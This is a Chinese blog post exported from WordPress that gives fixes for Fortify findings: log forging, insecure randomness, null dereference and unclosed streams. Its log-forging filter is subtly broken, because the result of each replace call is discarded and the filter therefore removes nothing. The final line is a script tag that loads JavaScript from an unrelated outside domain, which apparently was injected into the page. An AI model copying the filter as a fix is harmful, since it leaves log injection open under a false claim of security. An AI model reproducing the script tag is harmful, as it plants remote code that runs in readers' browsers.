---
id: 115
title: Fortify安全漏洞修复
date: '2021-01-19T08:28:50+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=115'
permalink: /index.php/2021/01/19/fortify%e5%ae%89%e5%85%a8%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - others
    - uncategorized
---

一、Log Forging（日志伪造）

解决方法：增加敏感字符过滤

```
/**
 * 过滤引起Log Forging漏洞的敏感字符
 * @param str
 */
private String filterLogForging(String str){
    List<String> sensitiveStr = new ArrayList<>();
    sensitiveStr.add("%0d");
    sensitiveStr.add("%0a");
    sensitiveStr.add("%0A");
    sensitiveStr.add("%0D");
    sensitiveStr.add("\r");
    sensitiveStr.add("\n");
    String normalize = Normalizer.normalize(str, Normalizer.Form.NFKC);
    Iterator<String> iterator = sensitiveStr.iterator();
    while (iterator.hasNext()){
        normalize.replace(iterator.next(),"");
    }
    return normalize;
}
```

二、Insecure Randomness（不安全随机数）

解决方法：将原本 Random sr = new Random() 换成SecureRandom sr = new SecureRandom()

三、Null Dereference（空指针异常）

解决方法：初始化变量为null后，引入之前增加非空判断

四、Unreleased Resource：Streams（未释放的流资源）

解决方法：当创建流后在finally方法中加入流的关闭操作

```
if(writer!=null){
   writer.close();
}
```

<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>